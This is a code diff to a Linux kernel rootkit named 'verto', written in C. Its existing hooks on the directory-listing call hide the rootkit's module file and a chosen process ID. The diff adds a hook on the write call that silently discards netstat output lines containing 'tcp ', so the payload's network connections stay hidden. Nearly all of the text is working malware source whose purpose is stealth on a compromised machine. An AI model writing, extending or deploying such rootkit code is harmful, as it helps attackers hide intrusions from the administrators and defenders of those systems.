@@ -73,6 +73,7 @@ char *payload_PID = NULL; //Modified by module_param (parse in process id to hid
 //will live in usr/games
 char ko_fl[]  = "verto.ko"; //~ namley hide the kernel object file used to insert the kit
 char kit_name[] = "verto";
+char svr_addr[] = "tcp "; //hide outbound & inbound connections from payload
 // ------------------------------ //
 
 //                                                 - Original getdents System Call - 
@@ -107,7 +108,7 @@ asmlinkage int gedent_hook(unsigned int fd, struct linux_dirent *dirp, unsigned 
         remaining_bytes -= dirp3->d_reclen; //Gives numerical representation of next struct
     
         //Debbugging !REMOVE! ON SUCCESSFUL BUILD & DRY RUN
-        printk(KERN_INFO "remaining_bytes %d   \t File: %s " ,  remaining_bytes , dirp3->d_name );
+        //printk(KERN_INFO "remaining_bytes %d   \t File: %s " ,  remaining_bytes , dirp3->d_name );
         
 
         //checks if current file struct contains one of the files to be hidden (including the process id file)
@@ -163,6 +164,23 @@ asmlinkage ssize_t write_hook(int fd, const void *buf, size_t count){
         }
     }
 
+    if(strstr(current->comm, "netstat")){
+        temp_cc = (char *) kmalloc(count, GFP_KERNEL);
+
+        printk(KERN_INFO "NETSTAT CALLED!!!!");
+
+        copy_from_user(temp_cc, buf, count); //copy vars from user space
+
+        if(strstr(temp_cc, svr_addr) != NULL){ //check for module in buf
+
+            printk(KERN_INFO "FOUND SVR ADDR");
+            //free mmemory (limited heavily in kernel land)
+            kfree(temp_cc);
+            
+            //return count without calling original write to 'skip' our kit
+            return count;
+        }
+    }
 
     //if it is not our module write it
     return original_write(fd, buf, count);
@@ -226,6 +244,7 @@ static void __exit CleanupHooks(void) {
 // =========================================================== EXECUTE FUNCTIONS  ========================================================
 
 //define the proccess id as a module paramter to take in 
+
 module_param(payload_PID, charp, S_IWUSR); //Writable only, root only
 
 module_init(SetHooks);
